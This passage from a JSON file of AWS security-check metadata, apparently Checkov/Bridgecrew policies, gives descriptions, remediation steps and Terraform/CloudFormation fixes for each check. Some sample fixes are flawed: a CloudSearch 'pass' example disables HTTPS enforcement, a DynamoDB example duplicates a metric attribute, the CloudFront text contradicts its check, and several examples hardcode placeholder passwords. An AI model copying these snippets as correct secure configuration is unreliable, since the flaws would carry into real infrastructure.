        "description": "RDS clusters do not have an AWS Backup backup plan\nDescription\nEnsure that RDS clusters are included in your backup plans for the AWS Backup. AWS Backup is a fully managed backup service that helps you protect your data in the cloud by automatically backing up your data to a secure, durable storage location. By creating a backup plan, you can ensure that your data is regularly backed up and can be recovered in the event of data loss or corruption.\nFix - Buildtime \nTerraform\n\nResource: aws_rds_cluster, aws_backup_plan, aws_backup_selection\nArgument: plan_id and resources \n\nGoresource \"aws_rds_cluster\" \"rds_cluster_good\" {\n  cluster_identifier      = \"aurora-cluster-demo\"\n  engine                  = \"aurora-mysql\"\n  engine_version          = \"5.7.mysql_aurora.2.03.2\"\n  availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n  database_name           = \"mydb\"\n  master_username         = \"foo\"\n  master_password         = \"bar\"\n}\n\n\nresource \"aws_backup_plan\" \"example\" {\n  name = \"tf_example_backup_plan\"\n\n  rule {\n    rule_name         = \"tf_example_backup_rule\"\n    target_vault_name = \"vault-name\"\n    schedule          = \"cron(0 12 * * ? *)\"\n  }\n}\n\nresource \"aws_backup_selection\" \"backup_good\" {\n  iam_role_arn = \"arn:partition:service:region:account-id:resource-id\"\n  name         = \"tf_example_backup_selection\"\n  plan_id      = aws_backup_plan.example.id\n\n  resources = [\n    aws_rds_cluster.rds_cluster_good.arn\n  ]\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_263": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-app-flow-flow-uses-customer-managed-keys-cmks",
        "description": "AWS App Flow flow does not use Customer Managed Keys (CMKs)\nDescription\nThis policy identifies App Flow flow which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your App Flow flow data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_appflow_flow\" \"pass\" {\n  name = \"example\"\n\n  source_flow_config {\n    connector_type = \"S3\"\n    source_connector_properties {\n      s3 {\n        bucket_name   = aws_s3_bucket_policy.example_source.bucket\n        bucket_prefix = \"example\"\n      }\n    }\n  }\n\n  destination_flow_config {\n    connector_type = \"S3\"\n    destination_connector_properties {\n      s3 {\n        bucket_name = aws_s3_bucket_policy.example_destination.bucket\n\n        s3_output_format_config {\n          prefix_config {\n            prefix_type = \"PATH\"\n          }\n        }\n      }\n    }\n  }\n\n  task {\n    source_fields     = [\"exampleField\"]\n    destination_field = \"exampleField\"\n    task_type         = \"Map\"\n\n    connector_operator {\n      s3 = \"NO_OP\"\n    }\n  }\n\n  kms_arn = aws_kms_key.example.arn\n\n  trigger_config {\n    trigger_type = \"OnDemand\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_195": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-glue-component-is-associated-with-a-security-configuration",
        "description": "AWS Glue component is not associated with a security configuration\nDescription\nA security configuration specifies the encryption settings for data stored on data stores and for data in transit. By associating your Glue components with a security configuration, you can ensure that your data is encrypted in accordance with your security requirements.\nEncrypting your data can help protect it from unauthorized access and ensure the confidentiality of your data. This is especially important for sensitive data, such as financial or personal information.\nFix - Runtime\nFix - Buildtime\nTerraform\nTextresource \"aws_glue_crawler\" \"enabled\" {\n  database_name = \"aws_glue_catalog_database.example.name\"\n  name          = \"example\"\n  role          = \"aws_iam_role.example.arn\"\n\n  security_configuration = \"aws_glue_security_configuration.example.name\"\n}\n\nresource \"aws_glue_dev_endpoint\" \"enabled\" {\n  name     = \"example\"\n  role_arn = \"aws_iam_role.example.arn\"\n\n  security_configuration = \"aws_glue_security_configuration.example.name\"\n}\n\nresource \"aws_glue_job\" \"enabled\" {\n  name     = \"example\"\n  role_arn = \"aws_iam_role.example.arn\"\n\n  security_configuration = \"aws_glue_security_configuration.example.name\"\n\n  command {\n    script_location = \"s3://aws_s3_bucket.example.bucket/example.py\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_218": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudsearch-uses-the-latest-transport-layer-security-tls-1",
        "description": "AWS Cloudsearch does not use the latest (Transport Layer Security) TLS\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your AWS Cloudsearch domains.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudsearch_domain\" \"pass\" {\n  name = \"example-domain\"\n\n  scaling_parameters {\n    desired_instance_type = \"search.medium\"\n  }\n\n  index_field {\n    name            = \"headline\"\n    type            = \"text\"\n    search          = true\n    return          = true\n    sort            = true\n    highlight       = false\n    analysis_scheme = \"_en_default_\"\n  }\n\n  index_field {\n    name   = \"price\"\n    type   = \"double\"\n    search = true\n    facet  = true\n    return = true\n    sort   = true\n  }\n  endpoint_options {\n    enforce_https       = false\n    tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_11": {
        "url": "https://docs.bridgecrew.io/docs/logging_9-enable-vpc-flow-logging",
        "description": "AWS VPC Flow logs not enabled\nDescription\nVPC Flow Logs is a feature that enables you to capture information about the IP traffic going to and from network interfaces in your VPC. After you have created a flow log, you can view and retrieve its data in Amazon CloudWatch Logs. VPC Flow Logs provide visibility into network traffic that traverses the VPC.\nWe recommend that VPC Flow Logs are enabled for packet Rejects for VPCs to help detect anomalous traffic and insight during security workflows.\nFix - Runtime \nAWS Console\nTo determine if the VPC Flow logs is enabled, follow these steps:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/]\nSelect Services.\nSelect VPC.\nIn the left navigation pane, select Your VPCs.\nSelect a VPC.\nIn the right pane, select the Flow Logs tab.\nIf no Flow Log exists, click Create Flow Log.\nSet Filter to Reject.\nEnter a Role and Destination Log Group.\nClick Create Log Flow.\nClick CloudWatch Logs Group.\n\nFix - Buildtime \nTerraform\n\nResources: aws_flow_log + aws_vpc\nArgument: vpc_id (of aws_flow_log)\n\nGoresource \"aws_flow_log\" \"example\" {\n  iam_role_arn    = \"arn\"\n  log_destination = \"log\"\n  traffic_type    = \"ALL\"\n+ vpc_id          = aws_vpc.ok_vpc.id\n}\n\nresource \"aws_vpc\" \"ok_vpc\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_15": {
        "url": "https://docs.bridgecrew.io/docs/iam_5",
        "description": "AWS IAM password policy does not have an uppercase character\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one uppercase letter, this increases security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Requires at least one uppercase letter. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --require-uppercase-characters\n\nFix - Buildtime\nTerraform\nResource: \nArgument: require_uppercase_characters\n\ud83d\udcd8NoteAll commands starting with aws iam update-account-password-policy can be combined into a single command.",
        "severity": "MEDIUM"
    },
    "CKV_AWS_11": {
        "url": "https://docs.bridgecrew.io/docs/iam_6",
        "description": "AWS IAM password policy does not have a lowercase character\nDescription\nPassword policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one lowercase letter, this increases security, especially from a brute force attack.\nFix - Runtime \nAWS Console\nTo change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.\nTo manually set the password policy with a minimum length, follow these steps:\n\nLog in to the AWS Management Console as an IAM user at https://console.aws.amazon.com/iam/.\nNavigate to IAM Services.\nOn the Left Pane click Account Settings.\nSelect Requires at least one lowercase letter. \nClick Apply password policy.\n\nCLI Command\nTo change the password policy, use the following command:\nBashaws iam update-account-password-policy --require-lowercase-characters\n\nFix - Buildtime\nTerraform\nTextresource \"aws_iam_account_password_policy\" \"strict\" {\n  minimum_password_length        = 8\n  require_lowercase_characters   = true\n  require_numbers                = true\n  require_uppercase_characters   = true\n  require_symbols                = true\n  allow_users_to_change_password = true\n}\n\n\ud83d\udcd8NoteAll commands starting with aws iam update-account-password-policy can be combined into a single command.",
        "severity": "MEDIUM"
    },
    "CKV_AWS_260": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-security-groups-do-not-allow-ingress-from-00000-to-port-80",
        "description": "AWS security groups allow ingress from 0.0.0.0/0 to port 80\nDescription\nAllowing ingress from 0.0.0.0/0 to port 80 (i.e. the HTTP port) can expose your Amazon Web Services (AWS) resources to potential security threats. This is because 0.0.0.0/0 represents all IP addresses, and allowing traffic from all IP addresses to port 80 can make it easier for attackers to access your resources.\nBy ensuring that your AWS security groups do not allow ingress from 0.0.0.0/0 to port 80, you can help protect your resources from potential attacks and unauthorized access. Instead, you should specify the IP addresses or ranges of IP addresses that are allowed to access your resources, and only allow traffic from those sources.\nFix - Buildtime\nTerraform\nGoresource \"aws_security_group\" \"bar-sg\" {\n  name   = \"sg-bar\"\n  vpc_id = aws_vpc.main.id\n  ingress {\n    from_port = 80\n    to_port   = 80\n    protocol  = \"tcp\"\n    security_groups = [aws_security_group.foo-sg.id]\n    description = \"foo\"\n  }\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_248": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-does-not-use-the-default-security-group",
        "description": "AWS Elasticsearch uses the default security group\nDescription\nUsing the default security group for your Elasticsearch clusters can leave your clusters vulnerable to unauthorized access and other security threats. This is because the default security group has a number of inbound and outbound rules that allow traffic from any source, which can make it easier for attackers to gain access to your clusters.\nBy ensuring that AWS Elasticsearch does not use the default security group, you can help protect your clusters from unauthorized access and other security threats. Instead, you should create custom security groups that are tailored to your specific security needs, and use those for your Elasticsearch clusters. This can help you more effectively control access to your clusters and protect them from potential threats.\nBuildtime - Fix\nTerraform\nGoresource \"aws_elasticsearch_domain\" \"pass\" {\n  domain_name           = \"example\"\n  elasticsearch_version = \"7.10\"\n\n  cluster_config {\n    instance_type = \"r4.large.elasticsearch\"\n  }\n\n  vpc_options {\n    security_group_ids = [\"sg_1234545\"]\n  }\n\n  tags = {\n    Domain = \"TestDomain\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_242": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-scheduler-logs-enabled",
        "description": "AWS MWAA environment has scheduler logs disabled\nDescription\nIt is recommended to have a proper logging process for AWS MWAA environment scheduler in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_mwaa_environment\" \"pass\" {\n  dag_s3_path        = \"dags/\"\n  execution_role_arn = \"aws_iam_role.example.arn\"\n\n  logging_configuration {\n    dag_processing_logs {\n      enabled   = true\n      log_level = \"DEBUG\"\n    }\n\n    scheduler_logs {\n      enabled   = true\n      log_level = \"INFO\"\n    }\n  }\n\n  name = \"example\"\n\n  network_configuration {\n    security_group_ids = [\"aws_security_group.example.id\"]\n    subnet_ids         = \"aws_subnet.private[*].id\"\n  }\n\n  source_bucket_arn = \"aws_s3_bucket.example.arn\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_36": {
        "url": "https://docs.bridgecrew.io/docs/logging_2",
        "description": "AWS CloudTrail log validation is not enabled in all regions\nDescription\nCloudTrail log file validation creates a digitally signed digest file containing a hash of each log that CloudTrail writes to S3. These digest files can be used to determine whether a log file was changed, deleted, or unchanged after CloudTrail delivered the log. It is recommended that file validation be enabled on all CloudTrails. \nWe recommend enabling log file validation to provide additional integrity checking of CloudTrail logs. \nFix - Runtime \nAWS Console\nTo enable log file validation on a given trail, follow these steps:\n\nLog in to the AWS Management Console at https://console.aws.amazon.com/.\nOpen the IAM console.\nOn the left navigation pane, click Trails.\nSelect the target trail. \nNavigate to the S3 section, click the edit icon (pencil). \nClick Advanced.\nIn the Enable log file validation section, select Yes.\nClick Save.\n\nCLI Command\nTo enable log file validation on an AWS CloudTrail, use the following command:\nBashaws cloudtrail update-trail \n--name <trail_name> \n--enable-log-file-validation\n\nTo start periodic validation of logs using these digests, use the following command: \nBashaws cloudtrail validate-logs \n--trail-arn <trail_arn> \n--start-time <start_time> \n--end-time <end_time>\n\nFix - Buildtime \nTerraform\n\nResource: aws_cloudtrail\nArgument: enable_log_file_validation - (Optional) Specifies whether log file integrity validation is enabled. Defaults to false.\n\nGoresource \"aws_cloudtrail\" \"trail_1\" {\n  ...\n  name                          = \"terraform.env-trail-01\"\n+ enable_log_file_validation    = true\n}\n\nCloudFormation\n\nResource: AWS::CloudTrail::Trail\nArgument: Properties.EnableLogFileValidation\n\nYAMLResources: \n   myTrail: \n      Type: AWS::CloudTrail::Trail\n      Properties: \n        ...\n+       EnableLogFileValidation: True\n",
        "severity": "LOW"
    },
    "CKV_AWS_209": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cluster-logging-is-encrypted-using-a-customer-managed-key-cmk",
        "description": "AWS cluster logging is not encrypted using a Customer Managed Key (CMK)\nDescription\nThis policy identifies cluster logging which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your cluster logging data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nTextresource \"aws_ecs_cluster\" \"pass2\" {\n  name = \"white-hart\"\n  configuration {\n    execute_command_configuration {\n      kms_key_id = aws_kms_key.example.arn\n\n      log_configuration {\n        #        cloud_watch_encryption_enabled = true\n        # cloud_watch_log_group_name     = aws_cloudwatch_log_group.example.name\n\n        # or\n        # s3_bucket_name=   and\n        s3_bucket_encryption_enabled = true\n      }\n    }\n  }\n  tags = { test = \"fail\" }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_243": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-worker-logs-enabled",
        "description": "AWS MWAA environment has worker logs disabled\nDescription\nIt is recommended to have a proper logging process for AWS MWAA environment worker in order to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_mwaa_environment\" \"pass\" {\n  dag_s3_path        = \"dags/\"\n  execution_role_arn = \"aws_iam_role.example.arn\"\n\n  logging_configuration {\n    worker_logs {\n      enabled   = true\n      log_level = \"CRITICAL\"\n    }\n  }\n\n  name = \"example\"\n\n  network_configuration {\n    security_group_ids = [\"aws_security_group.example.id\"]\n    subnet_ids         = \"aws_subnet.private[*].id\"\n  }\n\n  source_bucket_arn = \"aws_s3_bucket.example.arn\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_226": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-db-instance-gets-all-minor-upgrades-automatically",
        "description": "AWS DB instance does not get all minor upgrades automatically\nDescription\nWhen Amazon Relational Database Service (Amazon RDS) supports a new version of a database engine, you can upgrade your DB instances to the new version. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable RDS with minimal impact on the application. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.\nFix - Runtime\nAWS Console\nEnable RDS auto minor version upgrades.\n\nGo to the AWS console RDS dashboard.\nIn the navigation pane, choose Instances.\nSelect the database instance you wish to configure.\nFrom the Instance actions menu, select Modify.\nUnder the Maintenance section, choose Yes for Auto minor version upgrade.\nSelect Continue and then Modify DB Instance.\n\nCLI Command\nShellaws rds modify-db-instance \\\n  --region ${region} \\\n  --db-instance-identifier ${resource_name} \\\n  --auto-minor-version-upgrade \\\n  --apply-immediately\n\nFix - Buildtime\nCloudFormation\nYAMLResources:\n  Example:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      DBName: 'example'\n      DBInstanceClass: 'db.t3.micro'\n      Engine: 'mysql'\n      MasterUsername: 'master'\n      MasterUserPassword: 'password'\n+     AutoMinorVersionUpgrade: true\n\nTerraform\nGoresource \"aws_db_instance\" \"example\" {\n  allocated_storage          = 20\n  engine                     = \"mysql\"\n  engine_version             = \"5.7\"\n  instance_class             = \"db.t3.micro\"\n  name                       = \"mydb\"\n  username                   = \"foo\"\n  password                   = \"foobarbaz\"\n  parameter_group_name       = \"default.mysql5.7\"\n+ auto_minor_version_upgrade = true\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_229": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-21",
        "description": "AWS NACL allows ingress from 0.0.0.0/0 to port 21\nDescription\nNetwork Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 21. Removing unfettered connectivity to remote console services, such as FTP, reduces a server's exposure to risk.\nFix - Buildtime\nCloudFormation\nYAMLResources:  \n  InboundRule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n       NetworkAclId:\n         Ref: MyNACL\n       RuleNumber: 200\n       Protocol: 6\n       RuleAction: allow\n-      CidrBlock: 0.0.0.0/0\n+      CidrBlock: 10.0.0.0/32\n       PortRange:\n         From: 21\n         To: 21\n\nTerraform\nGoresource \"aws_network_acl_rule\" \"example\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 200\n  egress         = false\n  protocol       = \"tcp\"\n  rule_action    = \"allow\"\n- cidr_block     = \"0.0.0.0/0\"\n+ cidr_block     = \"10.0.0.0/32\"\n  from_port      = 21\n  to_port        = 21\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_216": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-distribution-is-enabled",
        "description": "AWS Cloudfront distribution is disabled\nDescription\nWhen a CloudFront distribution is enabled, it will continue to incur charges for data transfer and requests, even if it is not being used by your application. Disabling the distribution can help to reduce these costs. In addition, leaving an unused CloudFront distribution enabled can also pose a security risk, as it may be vulnerable to attack or misuse. Disabling the distribution can help to mitigate these risks.\nHowever, it is important to note that disabling a CloudFront distribution may cause any applications or websites that rely on it to become unavailable. \nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudfront_distribution\" \"pass\" {\n  dynamic \"origin\" {\n    for_each = local.origins\n    content {\n      domain_name = origin.value[\"domain_name\"]\n      origin_id   = origin.value[\"origin_id\"]\n\n      s3_origin_config {\n        origin_access_identity = origin.value[\"origin_access_identity\"]\n      }\n    }\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  default_root_object = \"index.html\"\n\n  default_cache_behavior {\n    allowed_methods  = var.default_behaviour.allowed_methods\n    cached_methods   = var.default_behaviour.cached_methods\n    target_origin_id = var.default_behaviour.origin_id\n\n    forwarded_values {\n      query_string = var.default_behaviour.query_string\n\n      cookies {\n        forward = var.default_behaviour.forward\n      }\n    }\n\n    viewer_protocol_policy = \"allow-all\"\n    min_ttl                = var.default_behaviour.min_ttl\n    default_ttl            = var.default_behaviour.default_ttl\n    max_ttl                = var.default_behaviour.max_ttl\n  }\n\n  dynamic \"ordered_cache_behavior\" {\n    for_each = var.behaviours\n    content {\n      path_pattern     = ordered_cache_behavior.value[\"path_pattern\"]\n      allowed_methods  = ordered_cache_behavior.value[\"allowed_methods\"]\n      cached_methods   = ordered_cache_behavior.value[\"cached_methods\"]\n      target_origin_id = ordered_cache_behavior.value[\"origin_id\"]\n      forwarded_values {\n        headers      = ordered_cache_behavior.value[\"headers\"]\n        query_string = ordered_cache_behavior.value[\"query_string\"]\n        cookies {\n          forward = ordered_cache_behavior.value[\"forward\"]\n        }\n      }\n      min_ttl                = ordered_cache_behavior.value[\"min_ttl\"]\n      default_ttl            = ordered_cache_behavior.value[\"default_ttl\"]\n      max_ttl                = ordered_cache_behavior.value[\"max_ttl\"]\n      compress               = ordered_cache_behavior.value[\"compress\"]\n      viewer_protocol_policy = \"allow-all\"\n    }\n  }\n\n  price_class = \"PriceClass_200\"\n\n  restrictions {\n    geo_restriction {\n      restriction_type = var.geo_restrictions[\"restriction_type\"]\n      locations        = var.geo_restrictions[\"locations\"]\n    }\n  }\n\n  viewer_certificate {\n    cloudfront_default_certificate = var.viewer_certificate[\"cloudfront_default_certificate\"]\n    minimum_protocol_version       = var.viewer_certificate[\"minimum_protocol_version\"]\n  }\n\n  lifecycle {\n    ignore_changes = [tags]\n  }\n  tags = {\n    \"key\" = \"value\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_264": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-app-flow-connector-profile-uses-customer-managed-keys-cmks",
        "description": "AWS App Flow connector profile does not use Customer Managed Keys (CMKs)\nDescription\nThis policy identifies App Flow connector profile which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your App Flow connector profile data. It gives you full control over the encrypted data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appflow_connector_profile\" \"pass\" {\n  name            = \"example_profile\"\n  connector_type  = \"Redshift\"\n  connection_mode = \"Public\"\n  kms_arn = aws_kms_key.example.arn\n\n\n  connector_profile_config {\n\n    connector_profile_credentials {\n      redshift {\n        password = aws_redshift_cluster.example.master_password\n        username = aws_redshift_cluster.example.master_username\n      }\n    }\n\n    connector_profile_properties {\n      redshift {\n        bucket_name  = aws_s3_bucket.example.name\n        database_url = \"jdbc:redshift://${aws_redshift_cluster.example.endpoint}/${aws_redshift_cluster.example.database_name}\"\n        role_arn     = aws_iam_role.example.arn\n      }\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_194": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled",
        "description": "AWS AppSync has field-level logs disabled\nDescription\nIt is recommended to have a proper logging process for AWS AppSync in order to detect anomalous configuration activity. It is used to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_appsync_graphql_api\" \"all\" {\n  authentication_type = \"API_KEY\"\n  name                = \"example\"\n\n  log_config {\n    cloudwatch_logs_role_arn = \"aws_iam_role.example.arn\"\n    field_log_level          = \"ALL\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_246": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-rds-cluster-activity-streams-are-encrypted-by-key-management-service-kms-using-customer-managed-keys-cmks",
        "description": "AWS RDS Cluster activity streams are not encrypted by Key Management Service (KMS) using Customer Managed Keys (CMKs)\nDescription\nThis policy identifies RDS Cluster activity streams which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your RDS Cluster activity streams data. It gives you full control over the encrypted data.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\n Resource: aws_rds_cluster_activity_stream\n Arguments: kms_key_id\nGoresource \"aws_rds_cluster_activity_stream\" \"pass\" {\n  resource_arn = aws_rds_cluster.default.arn\n  mode         = \"async\"\n  kms_key_id   = aws_kms_key.default.key_id\n\n  depends_on = [aws_rds_cluster_instance.default]\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_259": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-cloudfront-response-header-policy-enforces-strict-transport-security",
        "description": "AWS CloudFront response header policy does not enforce Strict Transport Security\nDescription\nEnforcing Strict Transport Security (HSTS) in your AWS CloudFront response header policy can help to improve the security of your website or application.\nHSTS is a security feature that tells web browsers to only communicate with a website using secure HTTPS connections, rather than insecure HTTP connections. This helps to prevent man-in-the-middle attacks and other types of vulnerabilities that could be exploited over an unencrypted connection.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"aws_cloudfront_response_headers_policy\" \"pass\" {\n  name    = \"test\"\n\n  security_headers_config {\n    strict_transport_security {\n      access_control_max_age_sec = 31536000\n      include_subdomains         = true\n      override                   = true\n      preload                    = true\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_256": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-dlm-cross-region-schedules-are-encrypted-using-a-customer-managed-key-cmk",
        "description": "AWS DLM cross-region schedules are not encrypted using a Customer Managed Key (CMK)\nDescription\nThis policy identifies Elastic File DLM cross-region schedules which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your DLM cross-region schedules data. It gives you full control over the encrypted data.\nFix - Runtime\nFix - Buildtime\nTerraform\n Resource: aws_dlm_lifecycle_policy\n Arguments: cross_region_copy_rule.cmk_arn\nTextresource \"aws_dlm_lifecycle_policy\" \"pass\" {\n  description        = \"example DLM lifecycle policy\"\n  execution_role_arn = aws_iam_role.dlm_lifecycle_role.arn\n  state              = \"ENABLED\"\n\n  policy_details {\n    resource_types = [\"VOLUME\"]\n\n    schedule {\n      name = \"2 weeks of daily snapshots\"\n\n      create_rule {\n        interval      = 24\n        interval_unit = \"HOURS\"\n        times         = [\"23:45\"]\n      }\n\n      retain_rule {\n        count = 14\n      }\n\n      tags_to_add = {\n        SnapshotCreator = \"DLM\"\n      }\n\n      copy_tags = false\n\n      cross_region_copy_rule {\n        target    = \"us-west-2\"\n        encrypted = true\n        cmk_arn   = aws_kms_key.dlm_cross_region_copy_cmk.arn\n        copy_tags = true\n        retain_rule {\n          interval      = 30\n          interval_unit = \"DAYS\"\n        }\n      }\n\n      cross_region_copy_rule {\n        target    = \"us-west-2\"\n        encrypted = true\n        cmk_arn   = aws_kms_key.dlm_cross_region_copy_cmk.arn\n        copy_tags = true\n        retain_rule {\n          interval      = 20\n          interval_unit = \"DAYS\"\n        }\n      }\n    }\n\n    target_tags = {\n      Snapshot = \"true\"\n    }\n  }\n  tags = {\n    test = \"failed\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_16": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-is-enabled-on-your-dynamodb-tables",
        "description": "DynamoDB Tables do not have Auto Scaling enabled  \nDescription\nChecks if DynamoDB tables have autoscaling configuration. Note that for tables with billing_mode = \"PAY_PER_REQUEST\" such configuration is embedded by default.\nFix - Buildtime \nTerraform\n\nResource: aws_appautoscaling_target, aws_appautoscaling_policy, aws_dynamodb_table\n\nGoresource \"aws_dynamodb_table\" \"pass\" {\n  name           = \"user\"\n  hash_key       = \"user-id\"\n  billing_mode   = \"PROVISIONED\"\n  read_capacity  = 10\n  write_capacity = 10\n  attribute {\n    name = \"user-id\"\n    type = \"S\"\n  }\n}\n\nresource \"aws_appautoscaling_target\" \"pass\" {\n  resource_id        = \"table/${aws_dynamodb_table.pass.name}\"\n  scalable_dimension = \"dynamodb:table:ReadCapacityUnits\"\n  service_namespace  = \"dynamodb\"\n  min_capacity       = 1\n  max_capacity       = 15\n}\n\nresource \"aws_appautoscaling_policy\" \"pass\" {\n  name               = \"rcu-auto-scaling\"\n  service_namespace  = aws_appautoscaling_target.pass.service_namespace\n  scalable_dimension = aws_appautoscaling_target.pass.scalable_dimension\n  resource_id        = aws_appautoscaling_target.pass.resource_id\n  policy_type        = \"TargetTrackingScaling\"\n\n  target_tracking_scaling_policy_configuration {\n    predefined_metric_specification {\n      predefined_metric_type = \"RDSReaderAverageCPUUtilization\"\n      predefined_metric_type = \"DynamoDBReadCapacityUtilization\"\n    }\n  }\n}\n\n// or:\n    \nresource \"aws_dynamodb_table\" \"pass_on_demand\" {\n  name           = \"user\"\n  hash_key       = \"user-id\"\n  billing_mode   = \"PAY_PER_REQUEST\"\n\n  attribute {\n    name = \"user-id\"\n    type = \"S\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_45": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-config-recorder-is-enabled-to-record-all-supported-resources",
        "description": "AWS Config Recording is disabled\nDescription\nAWS Config is a web service that performs configuration management of supported AWS resources within your account and delivers log files to you. AWS config uses configuration recorder to detect changes in your resource configurations and capture these changes as configuration items. It continuously monitors and records your AWS resource configurations and allows you to automate the evaluation of recorded configurations against desired configurations. This policy generates alerts when AWS Config recorder is not enabled.\nFix - Runtime\nTBD\nFix - Buildtime\nTerraform\nGoresource \"aws_config_configuration_recorder\" \"pass_recorder\" {\n  name     = \"example\"\n  role_arn = aws_iam_role.r.arn\n\n  recording_group {\n    include_global_resource_types = true\n  }\n\n}\n\nresource \"aws_config_configuration_recorder_status\" \"pass\" {\n  name       = aws_config_configuration_recorder.pass_recorder.name\n  is_enabled = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_49": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-database-migration-service-endpoints-have-ssl-configured",
